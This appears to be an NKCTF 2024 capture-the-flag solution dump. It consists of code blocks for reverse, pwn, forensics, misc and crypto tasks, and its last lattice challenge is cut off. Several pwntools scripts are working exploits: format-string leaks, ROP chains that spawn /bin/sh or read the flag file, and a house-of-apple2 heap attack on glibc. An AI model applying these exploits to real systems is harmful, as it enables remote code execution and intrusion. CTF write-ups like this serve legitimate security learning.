from z3 import *x = Solver()num=25ans=[]v20 = [BitVec(('%d' % i),8) for i in range(25)]v45=v20[0]v44=v20[1]v43=v20[2]v42=v20[3]v41=v20[4]v40=v20[5]v39=v20[6]v38=v20[7]v37=v20[8]v36=v20[9]v35=v20[10]v34=v20[11]v33=v20[12]v32=v20[13]v31=v20[14]v30=v20[15]v29=v20[16]v28=v20[17]v27=v20[18]v26=v20[19]v25=v20[20]v24=v20[21]v23=v20[22]v22=v20[23]v21=v20[24]v45 = -105* (39* (2* (v45 & (-105* (39* (2 * (v34 & (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111))+ (v34 ^ (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111)))+ 23)+ 111))+ (v45 ^ (-105* (39* (2 * (v34 & (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111))                        + (v34 ^ (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111)))                       + 23)                      + 111)))          + 23)+ 111v44 = -105 * (39 * (2 * ((v32 ^ v31) & v44) + (v32 ^ v31 ^ v44)) + 23) + 111v43 = -105* (39       * (2 * (v43 & (-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111))        + (v43 ^ (-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111)))       + 23)+ 111v42 = -105 * (39 * (2 * ((v28 ^ 0x17) & v42) + (v28 ^ 0x17 ^ v42)) + 23) + 111v41 = -105* (39       * (2        * (v41 & (-105                * (39                 * (2 * (v25 & (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111))                  + (v25 ^ (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111)))                 + 23)                + 111))        + (v41 ^ (-105                * (39                 * (2 * (v25 & (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111))                  + (v25 ^ (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111)))                 + 23)                + 111)))       + 23)+ 111v40 = -105 * (39 * (2 * (v40 & (~v22 + v24 + 1)) + (v40 ^ (~v22 + v24 + 1))) + 23) + 111v39 = -105* (39       * (2 * (v39 & (-105 * (39 * (2 * (v37 & v38) + (v37 ^ v38)) + 23) + 111))        + (v39 ^ (-105 * (39 * (2 * (v37 & v38) + (v37 ^ v38)) + 23) + 111)))       + 23)+ 111v38 = -105* (39       * (2 * (v38 & (-105 * (39 * (2 * ((~v25 + v22 + 1) & 0x11) + ((~v25 + v22 + 1) ^ 0x11)) + 23) + 111))        + (v38 ^ (-105 * (39 * (2 * ((~v25 + v22 + 1) & 0x11) + ((~v25 + v22 + 1) ^ 0x11)) + 23) + 111)))       + 23)+ 111v37 = -105* (39       * (2 * (v37 & (v26 ^ (-105 * (39 * (2 * (v27 & 1) + (v27 ^ 1)) + 23) + 111)))        + (v37 ^ v26 ^ (-105 * (39 * (2 * (v27 & 1) + (v27 ^ 1)) + 23) + 111)))       + 23)+ 111v36 = ~v29 + -105 * (39 * (2 * (v28 & v36) + (v28 ^ v36)) + 23) + 111 + 1v35 = -105* (39       * (2 * (v35 & (-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111))        + (v35 ^ (-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111)))       + 23)+ 111v34 = -105* (39       * (2        * (v33 & (-105                * (39                 * (2 * (v32 & (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111))                  + (v32 ^ (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111)))                 + 23)                + 111))        + (v33 ^ (-105                * (39                 * (2 * (v32 & (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111))                  + (v32 ^ (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111)))                 + 23)                + 111)))       + 23)+ 111v33 = -105 * (39 * (2 * (v33 & v34) + (v33 ^ v34)) + 23) + 111v32 = -105 * (39 * (2 * (v32 & (v38 ^ v37)) + (v32 ^ v38 ^ v37)) + 23) + 111v31 = -105* (39       * (2        * (v40 & (-105                * (39                 * (2 * (v41 & (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111))                  + (v41 ^ (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111)))                 + 23)                + 111))        + (v40 ^ (-105                * (39                 * (2 * (v41 & (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111))                  + (v41 ^ (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111)))                 + 23)                + 111)))       + 23)+ 111v30 = -105* (39       * (2 * (v42 & (-105 * (39 * (2 * (v30 & 8) + (v30 ^ 8)) + 23) + 111))        + (v42 ^ (-105 * (39 * (2 * (v30 & 8) + (v30 ^ 8)) + 23) + 111)))       + 23)+ 111v29 = -105 * (39 * (2 * ((v43 ^ 0x4D) & v29) + (v43 ^ 0x4D ^ v29)) + 23) + 111v28 = -105* (39       * (2 * (v28 & (-105 * (39 * (2 * ((v44 ^ 0x17) & 0xF9) + (v44 ^ 0xEE)) + 23) + 111))        + (v28 ^ (-105 * (39 * (2 * ((v44 ^ 0x17) & 0xF9) + (v44 ^ 0xEE)) + 23) + 111)))       + 23)+ 111v27 = -105 * (39 * (2 * ((v28 ^ v30) & v27) + (v28 ^ v30 ^ v27)) + 23) + 111v26 = -105* (39       * (2 * (v33 & (-105 * (39 * (2 * (v31 & v26) + (v31 ^ v26)) + 23) + 111))        + (v33 ^ (-105 * (39 * (2 * (v31 & v26) + (v31 ^ v26)) + 23) + 111)))       + 23)+ 111v25 = -105 * (39 * (2 * (v25 & v34) + (v25 ^ v34)) + 23) + 111v24 = -105* (39       * (2 * (v37 & (-105 * (39 * (2 * (v24 & v39) + (v24 ^ v39)) + 23) + 111))        + (v37 ^ (-105 * (39 * (2 * (v24 & v39) + (v24 ^ v39)) + 23) + 111)))       + 23)+ 111v23 = -105 * (39 * (2 * (v40 & v23) + (v40 ^ v23)) + 23) + 111v22 = -105 * (39 * (2 * ((v45 ^ v43) & v22) + (v45 ^ v43 ^ v22)) + 23) + 111v21 = -105* (39       * (2 * (v21 & (-105 * (39 * (2 * (v44 & 0x18) + (v44 ^ 0x18)) + 23) + 111))        + (v21 ^ (-105 * (39 * (2 * (v44 & 0x18) + (v44 ^ 0x18)) + 23) + 111)))       + 23)+ 111v20[0]=v45v20[1]=v44v20[2]=v43v20[3]=v42v20[4]=v41v20[5]=v40v20[6]=v39v20[7]=v38v20[8]=v37v20[9]=v36v20[10]=v35v20[11]=v34v20[12]=v33v20[13]=v32v20[14]=v31v20[15]=v30v20[16]=v29v20[17]=v28v20[18]=v27v20[19]=v26v20[20]=v25v20[21]=v24v20[22]=v23v20[23]=v22v20[24]=v21for i in range(25):    v20[i]&=0xff
nv20=[0]*25dword=[0x00000000, 0xFFFFFFFE, 0xFFFFFFFF, 0x00000004, 0x00000001, 0xFFFFFFFF, 0x00000001, 0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFE, 0x00000000, 0xFFFFFFF6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFE, 0x00000001, 0xFFFFFFF3, 0xFFFFFFFF, 0xFFFFFFFA, 0xFFFFFFFF, 0xFFFFFFFE, 0x00000001, 0xFFFFFFFE, 0x00000000, 0x00000000, 0x00000000]for i in range(5):    for j in range(5):        v13 = 0        for k in range(5):            v3=((dword[5*i+k])*v20[5*k+j])&0xff            v9 = (-105 * (39 * (2 * (v13 & v3) + (v13 ^ v3)) + 23) + 111)&0xff            v13 = v9        nv20[5*i+j]=v13enc=[118, 116, 245, 47, 83, 72, 116, 69, 164, 95, 252, 99, 1, 208, 248, 170, 121, 70, 17, 126, 29, 145, 126, 142, 202]for i in range(25):    x.add(nv20[i]==enc[i])if x.check() == sat:    model = x.model()    print(model)# NKCTF{THut_1Ss_s@_eAsyhh}
```



```
printf("hello world!");
```



```
from pwn import*context(log_level='debug',arch='amd64', os='linux')
io = remote("node.nkctf.yuzhian.com.cn",31370)
libc = ELF('./libc.so.6')

elf = ELF('./pwn')
io.sendlineafter("option:n",'1')io.recvuntil('rank.n')for i in range(50):  io.sendline('20.0 SSS+')io.sendlineafter("option:n",'2')
io.sendafter("nickname.n",'%7$p%9$p')canary = int(io.recv(18),16)adr = int(io.recv(14),16)-0x1b25io.sendlineafter("maimai?n",'a')io.sendlineafter("option:n",'2')io.sendafter("nickname.n",'%13$p')libc_base = int(io.recv(14),16)-0x29d90pop_rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))pop_rsi = libc_base + next(libc.search(asm('pop rsi;ret;')))pop_rdx = libc_base + next(libc.search(asm('pop rdx;pop r12;ret;')))r12 =  libc_base + next(libc.search(asm('pop r12;ret;')))leave_ret = libc_base + next(libc.search(asm('leave;ret;')))open_addr=libc.symbols['open']+libc_baseread_addr=libc.symbols['read']+libc_basewrite_addr=libc.symbols['write']+libc_baseputs_addr=libc.symbols['puts']+libc_basemain = adr+0x1984 io.sendlineafter("maimai?n",'a')io.sendlineafter("option:n",'2')io.sendafter("nickname.n",'%8$p')stack = int(io.recv(14),16)-0x30-0x40print(hex(canary))print(hex(adr))print(hex(libc_base))print(hex(stack))
io.sendafter("maimai?n",b'./flagx00'.ljust(0x28,b'a')+p64(canary)+p64(0)+p64(pop_rdi)+p64(stack)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(0)+p64(open_addr)+p64(main))sleep(0.1)io.sendafter("maimai?n",b'./flagx00'.ljust(0x28,b'a')+p64(canary)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(adr+elf.bss()+0x200)+p64(pop_rdx)+p64(0x30)+p64(0)+p64(read_addr)+p64(main))sleep(0.1)io.sendafter("maimai?n",b'./flagx00'.ljust(0x28,b'a')+p64(canary)+p64(0)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(adr+elf.bss()+0x200)+p64(pop_rdx)+p64(0x30)+p64(0)+p64(write_addr)+p64(main))
io.interactive()
```



```
from pwn import * 
context.log_level='debug'context.arch='i386'p = remote("123.60.25.223", 10001)puts_plt = 0x403F94puts_got = 0x40922Cmain = 0x40145Ep.sendlineafter("NKCTF2024rn","%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p%p%p")p.recvuntil('.')p.recvuntil('.')addr1 = int(p.recv(8),16)p.recvuntil('.')addr2 = int(p.recv(8),16)p.recvuntil('.')addr3 = int(p.recv(8),16)p.recvuntil('00702570.')can = int(p.recv(8),16)p.recvuntil('004012D0')print(hex(addr1))print(hex(addr2))print(hex(addr3))print(hex(can))print(hex(stack))base = addr3-0x101b7640system = base+0x10144700cmd_adr = base+0x101048C8print(hex(base))payload = b'a'*0x64+p64(can)+p32(0)*2+p32(system)+p32(main)+p32(cmd_adr)p.sendlineafter("ohhh,no",payload)
p.interactive()
```



```
from pwn import *  from LibcSearcher import *from sympy.ntheory.modular import solve_congruence  context(log_level='debug',os='linux',arch='amd64')pwnfile = './leak'#io=process(pwnfile)io=remote('node.nkctf.yuzhian.com.cn',33977)    
def debug():    gdb.attach(io)    pause()
io.recvuntil("I'll tell you a secret")pay = b'x61x59x53x4fx47x43'
io.send(pay)io.recvline()
sleep(0.1)re0 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re1 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re2 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re3 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re4 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re5 = hex(int.from_bytes(io.recv(1)))print(b"re0"+b"  ",re0)print(b"re1"+b"  ",re1)print(b"re2"+b"  ",re2)print(b"re3"+b"  ",re3)print(b"re4"+b"  ",re4)print(b"re5"+b"  ",re5)

buf = u8(io.recvn(1))  # buf 低字节print("buf---->"+str(buf))  #debug()pay = b'x89'*8+b'b'*8+b'c'*8+b'd'*8+p8(buf+0x39)io.send(pay)

io.recvuntil("I'll tell you a secret")pay = b'x3dx3bx37x31x2fx29'io.send(pay)io.recvline()
sleep(0.1)re6 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re7 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re8 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re9 = hex(int.from_bytes(io.recv(1)))sleep(0.1)rea = hex(int.from_bytes(io.recv(1)))sleep(0.1)reb = hex(int.from_bytes(io.recv(1)))print(b"re6"+b"  ",re6)print(b"re7"+b"  ",re7)print(b"re8"+b"  ",re8)print(b"re9"+b"  ",re9)print(b"rea"+b"  ",rea)print(b"reb"+b"  ",reb)
congruences = [    (int(re0,16), 0x61),    (int(re1,16), 0x59),    (int(re2,16), 0x53),    (int(re3,16), 0x4f),    (int(re4,16), 0x47),    (int(re5,16), 0x43),    (int(re6,16), 0x3d),    (int(re7,16), 0x3b),    (int(re8,16), 0x37),    (int(re9,16), 0x31),    (int(rea,16),0x2f),    (int(reb,16),0x29),]
solutions = solve_congruence(*congruences)
for solution in solutions:    print("x 的值:", hex(solution))
x, _ = solve_congruence(*congruences)stdout = int(x)print("stdout--->",hex(stdout))
libc = ELF("/home/kali/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3.6_amd64/libc.so.6")libc_base = stdout-libc.sym['_IO_2_1_stdout_']bin_sh = libc_base + libc.search(b'/bin/sh').__next__() sys_adr = libc_base + libc.sym['system']pop_rdi = libc_base + 0x000000000002a3e5ret = libc_base + 0x0000000000029139
print("libc_base--->",hex(libc_base))#debug()
pay = p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_adr)+p8(buf+0x48+0x10)io.send(pay)
io.interactive()
```



```
(0x2000 + 0x500) / 2 = 0x1280(0x1280 + 0x930) / 2 = 0xdd8(0xdd8 + 0x500) / 2 = 0x96c(0x96c + 0x930) / 2 = 0x94e
```



```
from pwn import *import warnings
warnings.filterwarnings("ignore", category=BytesWarning)
context.arch = 'amd64'context.log_level = 'debug'
fn = './pallu'elf = ELF(fn)libc = ELF('./libc-2.23.so')
debug = 1if debug: p = process(fn)else: p = remote('node.nkctf.yuzhian.com.cn', 33889)
def dbg(s=''): if debug: gdb.attach(p, s) pause()
 else: pass
lg = lambda x, y: log.success(f'{x}: {hex(y)}')
 def menu(index): p.sendlineafter('Your choice:', str(index))

def add(index): menu(1) p.sendlineafter('pallu index:', str(index))

def edit(index, desc): menu(2) p.sendlineafter('pallu index:', str(index)) p.sendafter('input Labels:', desc)

def show(index): menu(3) p.sendlineafter('pallu index:', str(index))

def bleed(id1, id2, name): menu(4) p.sendlineafter('pallu index:', str(id1)) p.sendlineafter('pallu index:', str(id2)) p.sendlineafter('set name by yourself?(y/n)', 'y') p.send(name)

def delete(index): menu(5) p.sendlineafter('pallu index:', str(index))

def show2all(): menu(6)

def gift(): menu(8) p.recvuntil('Enter the git code:') p.sendline('Happy NKCTF2024!')

def house_of_apple2(fake_IO_file_addr): fake_IO_file = flat( { 0x18: 1, # _IO_write_ptr 0x58: one_gadget, # chain 0x78: _IO_stdfile_2_lock, # _lock 0x90: fake_IO_file_addr + 0x20, # _IO_wide_data 0xc8: _IO_wfile_jumps, # vtable 0x140: fake_IO_file_addr + 0x100, # fake wide vtable 0x158: one_gadget }, filler='x00' ) return fake_IO_file

add(2)add(2)bleed(0, 1, 'a' * 0x10)
show2all()p.recvuntil('a' * 0x10)heapbase = u64(p.recv(6).ljust(8, b'x00')) - 0x1290lg('heapbase', heapbase)
delete(0)delete(1)delete(2)
add(0)add(1)bleed(0, 1, 'aaaan') # -> 2
add(2)delete(0)bleed(2, 3, 'bbbbn') # -> 0
delete(2)bleed(0, 1, 'ccccn') # -> 2
delete(3)add(1)delete(3)delete(1)add(2)delete(0)
gift()p.recvuntil('Happy NKCTF2024!n')leak = (u64(p.recv(5).ljust(8, b'x00')) << 8) | 0xe0lg('leak', leak)libc_base = leak - 0x3c38e0lg('libc_base', libc_base)
free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']_IO_list_all = libc_base + 0x3c4520_IO_stdfile_2_lock = libc_base + 0x3c5790_IO_wfile_jumps = libc_base + 0x3c2260
gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]one_gadget = libc_base + gadgets[1]
bleed(1, 2, 'ddddn') # -> 3
delete(1)delete(2)
add(2)add(2)delete(3)add(0)
payload = b'a' * 0x200 + p64(0) + p64(0x951)payload += p64(libc_base + 0x3c40b8) * 2 + p64(heapbase + 0x210) + p64(_IO_list_all - 0x20)edit(0, payload)
payload = house_of_apple2(heapbase + 0x14a0)edit(2, payload)delete(2)add(0)
# dbg()
menu(9)
p.interactive()
```



```
Cute cain reminds you that you may use the following key welcome_to_NkCTF_and_this_is_the_enkey
```



```
Function Base64Decode(ByVal base64String As String) As String    Dim base64Decoded As Object    Dim base64 As Object    Set base64 = CreateObject("MSXML2.DOMDocument")    Set base64Decoded = CreateObject("MSXML2.DOMDocument")        If Not base64 Is Nothing And Not base64Decoded Is Nothing Then        base64.DataType = "bin.base64"        base64Decoded.DataType = "bin.base64"                base64Decoded.LoadXML base64String        Base64Decode = base64Decoded.NodeTypedValue    Else        Base64Decode = ""    End IfEnd Function
Sub DecodeBase64()    Dim base64String As String    Dim decodedString As String        base64String = "Q0IgRkMgM0IgRDUgM0QgRTkgQ0IgMjkgQzQgMTAgQ0EgM0QgOUQgREIgRjEgQTQNCkJEIEY4IDUzIDQyIDgwIERDIDkzIDUwIDA0IEM1IDhGIDA5IEREIEJFIDc0IEMzDQo5QiAzNCA0QyA3MSAwMyAwRiBBNCBFNCBGQSBFOCAwNiA5OCA2NCBGMSAxNSBDOA0KMTcgOTIgRTkgOEUgQjggM0EgQzcgQjMgRTIgRjAgMUIgQTUgNjggMzQgQzkgM0MNCjA3IDQ2IDYwIEZBIDc1IEZCIDFBIDBDIDUwIDNDIEU5IEFFIEEzIDdGIDlEIERFDQowQiBERiBBOCAzQyA4NyBEMSBGNiA5QyA0OSA3RCBGRiBBQyBCQSBFRiBFNiAzMQ=="        decodedString = Base64Decode(base64String)
End Sub
```



```
key:nT0*XoHBA2!Uc?
```



```
NKCTF{C0ngr@tu1atiOns_On_coMpleting_t3e_Fo3eNs1cs_Ch41lenge_I_wi1l_giv4_y0u_A_cain!!!!}
```



```
#/*<?php eval('echo "tanjin";'); __halt_compiler();?> */

#include <stdio.h> /*print ((("b" + "0" == 0) and eval('""')) or (0 and 'Randark_JMT' or "rec"));__DATA__ = 1"""""__END__===== . ===== */#ifdef __cplusplus char msg[5] = {'C','a','i','n','n'};#else char msg[9] = {'c','r','a','z','y','m','a','n','n'};#endif
int main() { int i; for(i = 0; i < 8; ++i) putchar(msg[i]); return 0;} /*"""#*/
```



```
import base64from urllib.parse import unquoteimport libnumfrom Crypto.PublicKey import RSA
pubkey = """-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----"""
prikey = """-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----"""
pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.n
def enc_replace(base64_str: str):    base64_str = base64_str.replace("/", "e5Lg^FM5EQYe5!yF&62%V$UG*B*RfQeM")    base64_str = base64_str.replace("+", "n6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8W")    return base64_str.replace("=", "JXWUDuLUgwRLKD9fD6&VY2aFeE&r@Ff2")
def encrypt(plain_text):    # 私钥加密    cipher_text = b""    for i in range(0, len(plain_text), 128):        part = plain_text[i:i+128]        enc = libnum.n2s(pow(libnum.s2n(part), prikey.d, n))        cipher_text += enc    return enc_replace(base64.b64encode(cipher_text).decode())
def decrypt(cipher_text):    cipher_text=unquote(cipher_text)    # 恢复原始字符    cipher_text = cipher_text.replace("JXWUDuLUgwRLKD9fD6&VY2aFeE&r@Ff2", "=")    cipher_text = cipher_text.replace("n6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8W", "+")    cipher_text = cipher_text.replace("e5Lg^FM5EQYe5!yF&62%V$UG*B*RfQeM", "/")
    # 对Base64编码的密文进行解码并进行替换操作    cipher_text = base64.b64decode(cipher_text)
    # 使用公钥解密    plain_text = b""    for i in range(0, len(cipher_text), 128):        part = cipher_text[i:i+128]        dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n))        plain_text += dec    return plain_text
if __name__ == '__main__':
    c = "G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2"    print(f"加密数据: {c}")
    decrypted_text = decrypt(c)    print(f"解密数据: {decrypted_text}")    with open("dec.data", "wb") as f:        f.write(decrypted_text)
```



```
from Crypto.Util.number import *from secret import flag
m1, m2 = bytes_to_long(flag[:len(flag)//2]), bytes_to_long(flag[len(flag)//2:])p, q, r, s = [getStrongPrime(512) for _ in range(4)]e = 0x10001
n = p * q * r * sx = pow(q + r, p, n)y = pow(p * q + r, p, n)z = pow(s + 1, m1, s ** 3)c = pow(m2, e * (s - 1), n)
print(f'{n = }')print(f'{x = }')print(f'{y = }')print(f'{z = }')print(f'{c = }')
# n = 16063619267258988011034805988633616492558472337115259037200126862563048933118401979462064790962157697989038876156970157178132518189429914950166878537819575544418107719419007799951815657212334175336430766777427972314839713871744747439745897638084891777417411340564312381163685003204182743581513722530953822420925665928135283753941119399766754107671729392716849464530701015719632309411962242638805053491529098780122555818774774959577492378249768503656934696409965037843388835948033129997732058133842695370074265039977902884020467413323500218577769082193651281154702147769044514475692164145099161948955990463002411473013# x = 3021730035236300354492366560252387204933590210661279960796549263827016146230329262559940840168033978439210301546282150367717272453598367244078695402717500358042032604007007155898199149948267938948641512214616076878271433754986480186150178487625316601499002827958344941689933374158456614113935145081427421623647242719093642478556263121508238995676370877385638074444859047640771188280945186355013165130171802867101829647797879344213688981448535289683363612035513789240264618036062440178755665951650666056478493289870170026121826588708849844053588998886259091357236645819074078054595561158630194224419831088510266212458# y = 8995787142441643101775260550632842535051686960331455373408888374295557050896156890779515089927839904014859222004906681231525326673182671984194300730575609496770604394218160422560576866112460837985407931067753009696969997384839637927957848613356269534870170452152926447601781637641134982178028922559652443398183848786034348994249923007092159192374765197460466878587635412657807328348343062302127490267456095927890461140420639805398464266081441243108883599713672104446500850203779995739675784794478089863001309614674686652597236324659979849324914804032046113978246674538411441434320732570934185579553749616238819583998# z = 1283646988194723153191718393109711130382429329041718186548715246082834666179475883560020086589684603980734305610989683434078096863563033623169666389076830792095374856743015929373461198718962686411467443788047511292138922700655772772117855226419561159782734009961921473456332468653898105909729309377890721920937410781006337057478451806364879679045839945032594716202888196404203782734864187890231653321470085251# c = 4988583141177813116287729619098477713529507701428689219486720439476625736884177254107631282807612305211904876847916760967188201601494592359879509876201418493870112712105543214178376471651715703062382025712952561985261461883133695993952914519494709871429166239968478488380137336776740647671348901626710334330855078254188539448122493675463406596681080368929986034772169421577420193671300532508625180845417164660544286332963072804192276425664877337357353975758574262657585309762422727680851018467657523970318042829660721433987195369353660020476598195375492128671951807024027929490113371463210453342974983253996717176870
```



```
from Crypto.Util.number import *import gmpy2
n = 16063619267258988011034805988633616492558472337115259037200126862563048933118401979462064790962157697989038876156970157178132518189429914950166878537819575544418107719419007799951815657212334175336430766777427972314839713871744747439745897638084891777417411340564312381163685003204182743581513722530953822420925665928135283753941119399766754107671729392716849464530701015719632309411962242638805053491529098780122555818774774959577492378249768503656934696409965037843388835948033129997732058133842695370074265039977902884020467413323500218577769082193651281154702147769044514475692164145099161948955990463002411473013x = 3021730035236300354492366560252387204933590210661279960796549263827016146230329262559940840168033978439210301546282150367717272453598367244078695402717500358042032604007007155898199149948267938948641512214616076878271433754986480186150178487625316601499002827958344941689933374158456614113935145081427421623647242719093642478556263121508238995676370877385638074444859047640771188280945186355013165130171802867101829647797879344213688981448535289683363612035513789240264618036062440178755665951650666056478493289870170026121826588708849844053588998886259091357236645819074078054595561158630194224419831088510266212458y = 8995787142441643101775260550632842535051686960331455373408888374295557050896156890779515089927839904014859222004906681231525326673182671984194300730575609496770604394218160422560576866112460837985407931067753009696969997384839637927957848613356269534870170452152926447601781637641134982178028922559652443398183848786034348994249923007092159192374765197460466878587635412657807328348343062302127490267456095927890461140420639805398464266081441243108883599713672104446500850203779995739675784794478089863001309614674686652597236324659979849324914804032046113978246674538411441434320732570934185579553749616238819583998z = 1283646988194723153191718393109711130382429329041718186548715246082834666179475883560020086589684603980734305610989683434078096863563033623169666389076830792095374856743015929373461198718962686411467443788047511292138922700655772772117855226419561159782734009961921473456332468653898105909729309377890721920937410781006337057478451806364879679045839945032594716202888196404203782734864187890231653321470085251c = 4988583141177813116287729619098477713529507701428689219486720439476625736884177254107631282807612305211904876847916760967188201601494592359879509876201418493870112712105543214178376471651715703062382025712952561985261461883133695993952914519494709871429166239968478488380137336776740647671348901626710334330855078254188539448122493675463406596681080368929986034772169421577420193671300532508625180845417164660544286332963072804192276425664877337357353975758574262657585309762422727680851018467657523970318042829660721433987195369353660020476598195375492128671951807024027929490113371463210453342974983253996717176870e = 0x10001
s = GCD(c - 1, n)m1 = ((z - 1) // s) % sm1 = long_to_bytes(m1)r3 = y ** 3 % (n // s)q = GCD(x - y, n)p = GCD(x-y-q, n//q)r = n//(p*q*s)phi = (q - 1)*(p - 1)*(r-1)d = gmpy2.invert((e * (s - 1)) // 4, phi)c_pqr = c % (p*q*r)m2 = pow(c, d, p*q*r)m2 = gmpy2.iroot(m2, 4)m2 = long_to_bytes(m2[0])print(m1+m2)# b'nkctf{cb5b7392-cca4-4ce2-87e7-930cf6b29959}'
```



```
from sage.all import *from flag import flag,n,deltadef hadamard_ratio(basis):    dimension = basis.nrows()    det_Lattice = det(basis)    mult=1.0    for v in basis:        mult *= float(v.norm(2))    hratio = (det_Lattice / mult) ** (1/dimension)    return hratiodef get_key(n):    l = 7    k = ceil(sqrt(n) + 1) * l    I = identity_matrix(n)    while 1:        V_ = random_matrix(ZZ,n, n, x=-l, y=l)        V = V_ + I*k        hada_ratio = hadamard_ratio(V)        if hada_ratio > 0.86:            U = unimodular_matrix(n)            W = V * U            return V, W        else:            continue
def unimodular_matrix(n):    S = identity_matrix(n)    X = identity_matrix(n)    for i in range(n):        for j in range(i,n):            S[j, i] = choice([-1,1])            X[i, j] = choice([-1,1])    assert  det(S*X) == 1 or det(S*X) == -1    return S*X
def get_error(n,delta):    k = 4*delta -2    tmp = []    tmp += [delta - 2]*(n//k)    tmp += [delta - 1]*( ((k-2)*n) // (2*k))    tmp += [delta]*(n//k)    tmp += [delta + 1]*( ((k-2)*n) // (2*k))    return tmp
assert len(flag) == 44assert delta < 20
